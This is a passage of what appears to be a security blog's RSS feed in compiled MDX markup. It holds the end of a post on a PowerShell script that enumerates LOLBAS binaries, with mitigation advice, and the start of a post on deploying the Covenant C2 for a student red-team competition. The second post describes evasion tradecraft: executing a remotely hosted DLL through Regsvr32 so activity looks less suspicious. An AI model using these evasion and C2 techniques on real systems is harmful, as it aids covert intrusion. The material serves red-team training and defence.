+    &quot;href&quot;: &quot;https://gtfobins.github.io/&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;GTFOBins&quot;), &quot;\nWindows was next.\nOne of the biggest obstacles is that compared to GTFOBins,\nLOLBAS is over quadruple the size. Using Python and Bash to quickly\naccumulate the files and output the information into an easy way\nto copy and paste is great. &quot;), mdx(&quot;p&quot;, null, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-wrapper&quot;,
+    &quot;style&quot;: {
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;display&quot;: &quot;block&quot;,
+      &quot;marginLeft&quot;: &quot;auto&quot;,
+      &quot;marginRight&quot;: &quot;auto&quot;,
+      &quot;maxWidth&quot;: &quot;871px&quot;
+    }
+  }), &quot;\n      &quot;, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;span&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-background-image&quot;,
+    &quot;style&quot;: {
+      &quot;paddingBottom&quot;: &quot;102.18140068886336%&quot;,
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;bottom&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;,
+      &quot;backgroundImage&quot;: &quot;url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAABJ0AAASdAHeZh94AAACLklEQVQ4y51U27KcIBAEFAQRUVBX18u6l1TykPz/53VG91ySVJ3K8Tx0MVDaMN0zw5qWIUaPy2XF7X7HOq1w2kHnGkIIMMaOwftnUFUe09zj+/oN1+GGNrSQaXqcsKqfgTE52lbC1wpOeViRHyfbUJYMSaLhnEZuGaxVyIxGIhIoSbHKwBnfkSYpMp3BZGaPZSp3WaSUMNogkxnYqWdQKkXlDVyaEUrUrkbIa9R1CVc4CCZ2KKVQOAdf+P3nV2JjDKqyQmEKsJZMKb3FeO7RSY/WNlBcEcH2oi+kXL9oqDKGrm8RYsBlvZCeHd1a07k6RhjC+6b0Fcahx0KkXekRQiB9k2OEW8p7wJ9rmjI0MUUXI0xhdrEDCyhF+fbNp1J+hRAc57HG/XFDp0/IhXlz+VBh85fbrS2wLCuapiGTerSshZb6QGFX/75QIBLZOI6YhhPGeYT3fu8aQXpu9cmPEHLOofVW6A49Ob25ba3dsREHFyAT+TFh0/x9sFX/OE6Ypgnr7YorIbekY0Iaik+k/Eq4ubvpKE2Gx487hr7HXM5Y44o5LrgGWt0MyywiiyhYASnkx4R5znC6UrfMC+ZhxMlRx7CMoKCZRkaxZHJvwfRl/U/KHOudRld/x8/yFx7uga7osHQLhuoMkxgI/on52LXvm35wNBNr9OeBnI40dehVSh7rlJ6mTVXn5F6FKB2iLiklmiBkjlT8a8Mhpbm3tdp9ueJ8mvZ2438U+xH8Bn1grZxfIP4rAAAAAElFTkSuQmCC&apos;)&quot;,
+      &quot;backgroundSize&quot;: &quot;cover&quot;,
+      &quot;display&quot;: &quot;block&quot;
+    }
+  })), &quot;\n  &quot;, mdx(&quot;picture&quot;, {
+    parentName: &quot;span&quot;
+  }, &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/cbef4edc206c107701526fd4c63ef865/e9904/automate.webp 871w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 871px) 100vw, 871px&quot;,
+    &quot;type&quot;: &quot;image/webp&quot;
+  })), &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/cbef4edc206c107701526fd4c63ef865/62d82/automate.png 871w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 871px) 100vw, 871px&quot;,
+    &quot;type&quot;: &quot;image/png&quot;
+  })), &quot;\n        &quot;, mdx(&quot;img&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-image&quot;,
+    &quot;src&quot;: &quot;/static/cbef4edc206c107701526fd4c63ef865/62d82/automate.png&quot;,
+    &quot;alt&quot;: &quot;Automate&quot;,
+    &quot;title&quot;: &quot;Automate&quot;,
+    &quot;loading&quot;: &quot;lazy&quot;,
+    &quot;style&quot;: {
+      &quot;width&quot;: &quot;100%&quot;,
+      &quot;height&quot;: &quot;100%&quot;,
+      &quot;margin&quot;: &quot;0&quot;,
+      &quot;verticalAlign&quot;: &quot;middle&quot;,
+      &quot;position&quot;: &quot;absolute&quot;,
+      &quot;top&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;
+    }
+  })), &quot;\n      &quot;), &quot;\n    &quot;)), mdx(&quot;h5&quot;, {
+    &quot;id&quot;: &quot;automating-the-extraction-of-important-information-from-each-file&quot;
+  }, &quot;Automating the extraction of important information from each file&quot;), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;checking-the-paths-in-powershell&quot;
+  }, &quot;Checking the Paths in Powershell&quot;), mdx(&quot;p&quot;, null, &quot;Organizing the information in Powershell was simple,\nusing a hash table. The key being the filepath mapped to\nan array of the Binary or Script name and an example command\nutilizing it. For example:&quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;&apos;C:\\Windows\\explorer.exe&apos; = &apos;Explorer.exe&apos;, &apos;explorer.exe calc.exe&apos;;\n&quot;)), mdx(&quot;p&quot;, null, &quot;Path on the left, mapped to the name of the Binary or Script\nand an example command utilizing it. &quot;), mdx(&quot;p&quot;, null, &quot;After creating the hash table the rest is a piece of cake.&quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;foreach($path in $dict.Keys){\n   Try\n    {         \n      if(Test-Path -Path $path){\n         $paths += $path\n      }\n    }\n    Catch {\n      Write-Host \&quot;An error occurred:\&quot;\n      Write-Host $_\n    }\n }\n&quot;)), mdx(&quot;p&quot;, null, &quot; Just iterate through the keys in the hash table and check\nif the path exists if it does add it to an array. Then at the\nend iterate through the array and pretty print it.\nTbe script\u2019s name was an obvious choice:\n&quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://github.com/NotoriousRebel/Find-LOLBAS&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;Find-LOLBAS&quot;), &quot;.&quot;), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;whats-next&quot;
+  }, &quot;What\u2019s Next?&quot;), mdx(&quot;ul&quot;, null, mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;p&quot;, {
+    parentName: &quot;li&quot;
+  }, &quot;Staying up to date with new LOLBAS additions&quot;)), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;p&quot;, {
+    parentName: &quot;li&quot;
+  }, &quot;Adding different ways to run the script such as through C# in Powershell&quot;)), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;p&quot;, {
+    parentName: &quot;li&quot;
+  }, &quot;Look into obfuscating payload with Crypt32.dll&quot;))), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;mitigation&quot;
+  }, &quot;Mitigation&quot;), mdx(&quot;ul&quot;, null, mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;p&quot;, {
+    parentName: &quot;li&quot;
+  }, &quot;Adhering to proper block rules such as\n&quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;Microsoft recommended block rules&quot;), &quot;\nand utilizing things such as Applocker and Software Restriction Policies &quot;)), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;p&quot;, {
+    parentName: &quot;li&quot;
+  }, &quot;Being cognisant of normal network traffic in and out of your system/s is also crucial\nas becoming familiar with daily traffic can make it very easy to spot when something is\nout of the ordinary&quot;)), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;p&quot;, {
+    parentName: &quot;li&quot;
+  }, &quot;Understanding the foundation of each LOLBAS is also important,\nknowing how each one is meant to be used will make it easier to spot when it is\nused for malicious purposes. &quot;))), mdx(&quot;p&quot;, null, &quot;Overall awareness is necessary as well, knowing how a LOLBAS should be used\nis key. For example, if you\u2019ve never used regsvr32 before and find it calling out to the internet\nthat should set off an alarm! &quot;), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;acknowledgements&quot;
+  }, &quot;Acknowledgements&quot;), mdx(&quot;p&quot;, null, &quot;This script wouldn\u2019t have been possible without the amazing people\nwho work on &quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://github.com/LOLBAS-Project/LOLBAS&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;LOLBAS&quot;), &quot;.&quot;), mdx(&quot;p&quot;, null, &quot;Special thanks to &quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://twitter.com/bohops&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;@Bohops&quot;), &quot;\nfor inspiration and &quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://twitter.com/Oddvarmoe&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;@Oddvarmoe&quot;), &quot;\nfor the consistent work and maintenance on the\n&quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://github.com/LOLBAS-Project/LOLBAS&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;LOLBAS&quot;), &quot; project.&quot;));
+}
+;
+MDXContent.isMDXComponent = true;</content:encoded></item><item><title><![CDATA[Power of Covenant]]></title><description><![CDATA[Deploying Covenant]]></description><link>https://secbytes.net/Power-of-Covenant</link><guid isPermaLink="false">https://secbytes.net/Power-of-Covenant</guid><dc:creator><![CDATA[NotoriousRebel]]></dc:creator><pubDate>Wed, 01 May 2019 00:00:00 GMT</pubDate><content:encoded>function _extends() { _extends = Object.assign || function (target) { for (var i = 1; i &lt; arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; }; return _extends.apply(this, arguments); }
+
+function _objectWithoutProperties(source, excluded) { if (source == null) return {}; var target = _objectWithoutPropertiesLoose(source, excluded); var key, i; if (Object.getOwnPropertySymbols) { var sourceSymbolKeys = Object.getOwnPropertySymbols(source); for (i = 0; i &lt; sourceSymbolKeys.length; i++) { key = sourceSymbolKeys[i]; if (excluded.indexOf(key) &gt;= 0) continue; if (!Object.prototype.propertyIsEnumerable.call(source, key)) continue; target[key] = source[key]; } } return target; }
+
+function _objectWithoutPropertiesLoose(source, excluded) { if (source == null) return {}; var target = {}; var sourceKeys = Object.keys(source); var key, i; for (i = 0; i &lt; sourceKeys.length; i++) { key = sourceKeys[i]; if (excluded.indexOf(key) &gt;= 0) continue; target[key] = source[key]; } return target; }
+
+/* @jsx mdx */
+var _frontmatter = {
+  &quot;title&quot;: &quot;Power of Covenant&quot;,
+  &quot;author&quot;: &quot;NotoriousRebel&quot;,
+  &quot;date&quot;: &quot;2019-05-01T00:00:00.000Z&quot;,
+  &quot;hero&quot;: &quot;./images/pwnboard_image.png&quot;,
+  &quot;excerpt&quot;: &quot;Deploying Covenant&quot;
+};
+
+var makeShortcode = function makeShortcode(name) {
+  return function MDXDefaultShortcode(props) {
+    console.warn(&quot;Component &quot; + name + &quot; was not imported, exported, or provided by MDXProvider as global scope&quot;);
+    return mdx(&quot;div&quot;, props);
+  };
+};
+
+var layoutProps = {
+  _frontmatter: _frontmatter
+};
+var MDXLayout = &quot;wrapper&quot;;
+return function MDXContent(_ref) {
+  var components = _ref.components,
+      props = _objectWithoutProperties(_ref, [&quot;components&quot;]);
+
+  return mdx(MDXLayout, _extends({}, layoutProps, props, {
+    components: components,
+    mdxType: &quot;MDXLayout&quot;
+  }), mdx(&quot;h1&quot;, {
+    &quot;id&quot;: &quot;using-covenant--red-teaming&quot;
+  }, &quot;Using Covenant &amp; Red Teaming&quot;), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;introduction&quot;
+  }, &quot;Introduction&quot;), mdx(&quot;p&quot;, null, &quot;This past weekend, I had my first ever red teaming experience at\nUniversity of Buffalo called &quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://lockdown.ubnetdef.org/&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;Lockdown&quot;), &quot;.\nI knew from the start I would be tackling Windows for this competition;\nhowever, I wasn\u2019t sure what I wanted to do. Did I want to use\nEmpire, Metasploit, maybe Pupy? The answer was none of the above.\nFor this competition I wanted to try out something new.&quot;), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;deploying-covenant&quot;
+  }, &quot;Deploying Covenant&quot;), mdx(&quot;p&quot;, null, &quot;I decided to go with &quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://github.com/cobbr/covenant&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;Covenant&quot;), &quot;.\nThis is a fairly recent C2 that came out a couple months ago\nbased on the .NET framework and written in C#. An interesting\naspect of this C2 is that it\u2019s divided into two parts, Covenant\nis the server and &quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://github.com/cobbr/Elite&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;Elite&quot;), &quot;\nis what interacts with the server. The last part is\njust Grunts, that is just the Implant.\nOne of the issues I came across when testing this is out is\nhow long it took to set up, I just wanted to at the start of the competition\nhit a button and have everything I needed. With some help from\nDocker I created a docker-compose file to assist me. This\n&quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://github.com/NotoriousRebel/covDeploy&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;file&quot;), &quot; did the\nheavy lifting for me. One really awesome aspect of this C2 was\nthat we could spin up Covenant on one server and when anyone\nssh\u2019d onto our server it would docker-compose up Elite for them.\nThis meant they didn\u2019t have to download docker-compose and would make\nthings centralized. &quot;), mdx(&quot;p&quot;, null, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-wrapper&quot;,
+    &quot;style&quot;: {
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;display&quot;: &quot;block&quot;,
+      &quot;marginLeft&quot;: &quot;auto&quot;,
+      &quot;marginRight&quot;: &quot;auto&quot;,
+      &quot;maxWidth&quot;: &quot;539px&quot;
+    }
+  }), &quot;\n      &quot;, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;span&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-background-image&quot;,
+    &quot;style&quot;: {
+      &quot;paddingBottom&quot;: &quot;77.36549165120594%&quot;,
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;bottom&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;,
+      &quot;backgroundImage&quot;: &quot;url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAABJ0AAASdAHeZh94AAACEklEQVQ4y4VTTW/TQBTMP0TqAYG48guQOCCgF07cS4Xbqq2ohABB00AgQnBBItBWFZCPUkjdFKjruElsEtfx+ms97K7t1HbS8qRVNu/NjN+83S0gF2EYisWjZ7r4oxMcGQSdgQu5a4t9HpeOwqQgxkDiURS/dLH8UcVKVcWTbQ265f1fMCkkoDT41gsZl+bqmHlQx42nLfjB+Vj+W0hbzVvncbd4gMsPG7gqNXHzmQzXpxfiMx1ysOMFbFGx+H/e4cx8A1ekGmZLTRiWDy9IcBF2osMkwQE0tkDj3O31A1xf3cO9V23crxxi5AYiT1OciwVpdi58btcWd3GHWZ/daMOOBccc5oKeJ+gHdGImO4cmyrUeKo0+ttpDBDTM1L0cp4BUN+pfh921kZhLfvC8s7RYVAsxtD2YxD87lDBFHBAKdeBNFWydEOyf2Bl7PLqnPuqKhYHtx6fMv8Y2mmFBVvrQdDPqJCaMHB8tRcfvjoFT2x2LcWGlbwqOyjjJq2CCbKhsv/GuCmlhAWvPyzBGgbDDQ1Z6mFtag7S0is1mO+axK8VIj0vvGWcRj9bfIjLFBJPWP9R+Yb74CS+r32GLapQ/1i0sv9nByutt/DjSxx3yB1PZakEqfUZ58yei8QrBaLPfdfBVIWiqBD49m53OLvI3lq8dE2hDL2N5T+N5B7sdkn4pIaa8cUT5yUJyulMZrPYPUrR25dOQv+QAAAAASUVORK5CYII=&apos;)&quot;,
+      &quot;backgroundSize&quot;: &quot;cover&quot;,
+      &quot;display&quot;: &quot;block&quot;
+    }
+  })), &quot;\n  &quot;, mdx(&quot;picture&quot;, {
+    parentName: &quot;span&quot;
+  }, &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/3606e72e109fd5d8d4bc85045496c8ce/5e521/plan.webp 539w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 539px) 100vw, 539px&quot;,
+    &quot;type&quot;: &quot;image/webp&quot;
+  })), &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/3606e72e109fd5d8d4bc85045496c8ce/644b1/plan.png 539w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 539px) 100vw, 539px&quot;,
+    &quot;type&quot;: &quot;image/png&quot;
+  })), &quot;\n        &quot;, mdx(&quot;img&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-image&quot;,
+    &quot;src&quot;: &quot;/static/3606e72e109fd5d8d4bc85045496c8ce/644b1/plan.png&quot;,
+    &quot;alt&quot;: &quot;Plan&quot;,
+    &quot;title&quot;: &quot;Plan&quot;,
+    &quot;loading&quot;: &quot;lazy&quot;,
+    &quot;style&quot;: {
+      &quot;width&quot;: &quot;100%&quot;,
+      &quot;height&quot;: &quot;100%&quot;,
+      &quot;margin&quot;: &quot;0&quot;,
+      &quot;verticalAlign&quot;: &quot;middle&quot;,
+      &quot;position&quot;: &quot;absolute&quot;,
+      &quot;top&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;
+    }
+  })), &quot;\n      &quot;), &quot;\n    &quot;)), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;using-covenant&quot;
+  }, &quot;Using Covenant&quot;), mdx(&quot;p&quot;, null, &quot;Deployment was trivial all we had to do was docker-compose up.&quot;), mdx(&quot;div&quot;, {
+    &quot;className&quot;: &quot;Image__Medium&quot;
+  }, &quot;\n  &quot;, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;div&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-wrapper&quot;,
+    &quot;style&quot;: {
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;display&quot;: &quot;block&quot;,
+      &quot;marginLeft&quot;: &quot;auto&quot;,
+      &quot;marginRight&quot;: &quot;auto&quot;,
+      &quot;maxWidth&quot;: &quot;1807px&quot;
+    }
+  }), &quot;\n      &quot;, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;span&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-background-image&quot;,
+    &quot;style&quot;: {
+      &quot;paddingBottom&quot;: &quot;52.73934698395129%&quot;,
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;bottom&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;,
+      &quot;backgroundImage&quot;: &quot;url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAABJ0AAASdAHeZh94AAACi0lEQVQozyWS2W7TUBRFr5vJztCQxHbiOE48pSRpk5a0hdBWahGI4QHEA+IP+AqEaGnoXDowSIiPXRw7D0eyfO199177qPnJOYfzU74czfl6/J3Ph8d8O7tkfnGdPh9d/eT+/jcXd785u/nJxe0vzm/uOftxz/zyhpPrO06vb5mfX/Hn7z+U5biojC5joPQqqiCj11DFBipbZrD3ilowQG92MVo+ejoBqib/LTuoko0y6iilE69NUdFghNUJMBoOhumiWx4Fq0vZCSjaHrPX7+lv7RJtbBNPZ8SbT2mPphSciHwrImf75M2OCNcZb++g4tEYrz+iHQ1xV8ZU2hG63VsIWi77bz8QrW/Rkm+81Sn2yoSSt0K2GZKxAzKNDpmak6Zb3XyCagd93HiI2Y1x+mOaMiURLYlgpt5m9vId3dE6VTeg1gkpNANyMongkumzJNGXqi1UvsJaIhgNJzjhAFs4OXJ7zR8KrwWrrOmxvnuAKeeGXFB2xb1EzaXuRLDRRXvQRlsWjvky8WiCejiZstwS4MLOENgJ8HInTgUKdpdgex9LcFTdkGonEQwX7qwAre6hiTutYkqZFRqOhwoljuWvUGolPDxyVo+8MDScJF4XXwSX/QEFOTcERfI+I4KaxNXSppto5Ubq0HSknP5kC19gNwJx0RumjPRWSDEpR2IHj59RFQwFEconcaXZJTsSwZ6sziKuJg2rXFEE5YKBNBiubUqLY+ryY1ZWIC9rozd7ZOsOk+dveRCMUudJGRlZk8Sdqomb6sKdVpTdzeqYTWm7PpnhbB0Q776h8/gF9bWnWJM92psHOBt7zD5+knc76OEG+XBKxn+E5q2jOQO0hKPE1iqWRC5hux7/AUZ3OKi0KW0lAAAAAElFTkSuQmCC&apos;)&quot;,
+      &quot;backgroundSize&quot;: &quot;cover&quot;,
+      &quot;display&quot;: &quot;block&quot;
+    }
+  })), &quot;\n  &quot;, mdx(&quot;picture&quot;, {
+    parentName: &quot;span&quot;
+  }, &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/9fc5b60b750c946791dd685a9ec537d6/18831/easy_deployment.webp 1807w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 1807px) 100vw, 1807px&quot;,
+    &quot;type&quot;: &quot;image/webp&quot;
+  })), &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/9fc5b60b750c946791dd685a9ec537d6/7be35/easy_deployment.png 1807w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 1807px) 100vw, 1807px&quot;,
+    &quot;type&quot;: &quot;image/png&quot;
+  })), &quot;\n        &quot;, mdx(&quot;img&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-image&quot;,
+    &quot;src&quot;: &quot;/static/9fc5b60b750c946791dd685a9ec537d6/7be35/easy_deployment.png&quot;,
+    &quot;alt&quot;: &quot;Easy-Deployment&quot;,
+    &quot;title&quot;: &quot;Easy-Deployment&quot;,
+    &quot;loading&quot;: &quot;lazy&quot;,
+    &quot;style&quot;: {
+      &quot;width&quot;: &quot;100%&quot;,
+      &quot;height&quot;: &quot;100%&quot;,
+      &quot;margin&quot;: &quot;0&quot;,
+      &quot;verticalAlign&quot;: &quot;middle&quot;,
+      &quot;position&quot;: &quot;absolute&quot;,
+      &quot;top&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;
+    }
+  })), &quot;\n      &quot;), &quot;\n    &quot;), &quot;\n  &quot;, mdx(&quot;h4&quot;, {
+    parentName: &quot;div&quot;
+  }, &quot;Docker commands to run to covenant &quot;)), mdx(&quot;p&quot;, null, &quot;In reality we would want to tack on -d when composing Covenant\nto background it.\nUsing powershell with a remote session would be too noisy,\nextremely easy to notice, and trivial to kill.\nTo make things stealthier I decided to go with registering a dll and utilizing Regsvr32.\nAs Regsvr32 is developed by Microsoft and in apart of System32\nit would look a lot less suspicious. However, this requires\nthe dotnet framework to be installed on the target machine.\nLuckily this is a oneliner that doesn\u2019t require a restart.&quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;Add-WindowsCapability \u2013Online -Name NetFx3~~~~ \u2013Source D:\\sources\\sxs\n&quot;)), mdx(&quot;p&quot;, null, &quot;The launcher is just a simple one liner, and the icing on the cake\nis that we can have our server host the dll file instead of having to get that file\non the target machine.&quot;), mdx(&quot;div&quot;, {
+    &quot;className&quot;: &quot;Image__Medium&quot;
+  }, &quot;\n  &quot;, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;div&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-wrapper&quot;,
+    &quot;style&quot;: {
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;display&quot;: &quot;block&quot;,
+      &quot;marginLeft&quot;: &quot;auto&quot;,
+      &quot;marginRight&quot;: &quot;auto&quot;,
+      &quot;maxWidth&quot;: &quot;1520px&quot;
+    }
+  }), &quot;\n      &quot;, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;span&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-background-image&quot;,
+    &quot;style&quot;: {
+      &quot;paddingBottom&quot;: &quot;47.17105263157894%&quot;,
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;bottom&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;,
+      &quot;backgroundImage&quot;: &quot;url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAABJ0AAASdAHeZh94AAAB0klEQVQozzWQ6W7aQBSFB0xsMGbzOh7vMzbeGGxDMEmUtK8QiUgRVSSiqmuCKqKmKOnyo1IfvEOqSufn/e537gVd1RyYjuwQFE9VkhsRRUlhZ5WTz9JZnVSLcbkgxXEbhTwkR5BwOj7SfCAq9OQ1GCHXSymKJmFZB0WNyyWZnUTz03x5Xp1dWPmMxckq8QVuGYTTgpbqgY5Ml6+ApFt96PUQZloF5wrJtXCihzkcUyelMExhmKlBIpgv2gPsc4oL2iNaXwBRt1vQa5mBZIWCEfC6Jxh+G/odhLsWlizStUjfIhIirZfOTdXjZAcIA1qfg57pOVmpkMzKKjnIWFgFlcnHlMn18VSNqBJOR0HGtE0Gyy43QkDo08UZGNokqmoUl2xOgEHHxCLz2GHPiVi6diRa0b9vNXXSUP3GyD7AfG9yfAok6Osk67txm12leR2I/9c+LBJMzEPM6QFzNjQMZBcMUXMAASdSBhtJoSTlMJsPksqkC7tYGvn8kLhQwknPSyU3FZ20bae8FfMw5DVfUO1GV46nc/Dh8efNw/frr782T7/vfvxZb79tds+bh+fN7unmy/7Ndr++31/f7a8+71cfH1fvd6u326vbT5fr23f3u787BU4XtShSlAAAAABJRU5ErkJggg==&apos;)&quot;,
+      &quot;backgroundSize&quot;: &quot;cover&quot;,
+      &quot;display&quot;: &quot;block&quot;
+    }
+  })), &quot;\n  &quot;, mdx(&quot;picture&quot;, {
+    parentName: &quot;span&quot;
+  }, &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/24c43eb13cf07214fd80d34f12bae877/39675/launcher.webp 1520w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 1520px) 100vw, 1520px&quot;,
+    &quot;type&quot;: &quot;image/webp&quot;
+  })), &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/24c43eb13cf07214fd80d34f12bae877/d4c50/launcher.png 1520w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 1520px) 100vw, 1520px&quot;,
+    &quot;type&quot;: &quot;image/png&quot;
+  })), &quot;\n        &quot;, mdx(&quot;img&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-image&quot;,
+    &quot;src&quot;: &quot;/static/24c43eb13cf07214fd80d34f12bae877/d4c50/launcher.png&quot;,
+    &quot;alt&quot;: &quot;Launcher&quot;,
+    &quot;title&quot;: &quot;Launcher&quot;,
